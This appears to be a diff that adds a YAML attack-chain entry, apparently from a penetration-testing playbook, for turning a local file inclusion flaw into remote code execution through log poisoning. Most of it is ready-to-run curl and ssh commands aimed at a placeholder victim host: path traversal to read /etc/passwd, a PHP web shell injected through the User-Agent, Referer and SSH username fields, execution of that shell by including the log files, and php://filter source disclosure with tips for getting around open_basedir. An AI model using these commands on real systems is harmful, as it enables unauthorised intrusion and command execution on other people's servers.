@@ -1,0 +1,62 @@
+chain_id: lfi_log_poisoning_to_rce
+title: "LFI → RCE via log poisoning (Apache, SSH)"
+severity: HIGH
+tags: [web, lfi, log-poisoning, rce]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/(read|file|page|include|view|download|fetch|cat)\\.(php|asp|aspx)" }
+    - { path_pattern: "(?i)\\?(file|page|include|template|view)=" }
+
+description: |
+  An LFI parameter was discovered. The classic uplift to RCE is log
+  poisoning: write PHP/JSP code into a log file the web server already
+  reads, then `?file=/var/log/...` to execute it. Two reliable sources:
+
+    - Apache access.log via a User-Agent / Referer payload
+    - SSH /var/log/auth.log via a username payload
+
+  Works only when the web user has read on the log file and PHP code
+  ends up unfiltered.
+
+steps:
+  - id: 1
+    title: "Confirm LFI reads files first"
+    command: |
+      curl 'http://$VICTIMA/read.php?file=/etc/passwd'
+      curl 'http://$VICTIMA/read.php?file=../../../../etc/passwd'
+
+  - id: 2
+    title: "Apache log poisoning — drop PHP via User-Agent"
+    command: |
+      curl -A '<?php system($_GET["cmd"]); ?>' http://$VICTIMA/
+      curl 'http://$VICTIMA/read.php?file=/var/log/apache2/access.log&cmd=id'
+
+  - id: 3
+    title: "Same trick via Referer header"
+    command: |
+      curl -e '<?php system($_GET["cmd"]); ?>' http://$VICTIMA/
+      curl 'http://$VICTIMA/read.php?file=/var/log/apache2/access.log&cmd=id'
+
+  - id: 4
+    title: "SSH auth.log poisoning — username carries the payload"
+    command: |
+      ssh '<?php system($_GET["cmd"]); ?>'@$VICTIMA
+      # Auth fails (expected), but the username lands in /var/log/auth.log:
+      curl 'http://$VICTIMA/read.php?file=/var/log/auth.log&cmd=id'
+
+  - id: 5
+    title: "If filter blocks /etc/passwd — try PHP wrappers"
+    command: |
+      curl 'http://$VICTIMA/read.php?file=php://filter/convert.base64-encode/resource=index.php'
+      # Decode the base64 to read source.
+
+common_errors:
+  - error: "open_basedir restriction in effect"
+    solution: |
+      php.ini limits which directories the script can read. Try the
+      `/proc/self/environ` or `/proc/self/fd/<n>` paths — those are
+      almost always whitelisted.
+
+references:
+  - https://book.hacktricks.xyz/pentesting-web/file-inclusion
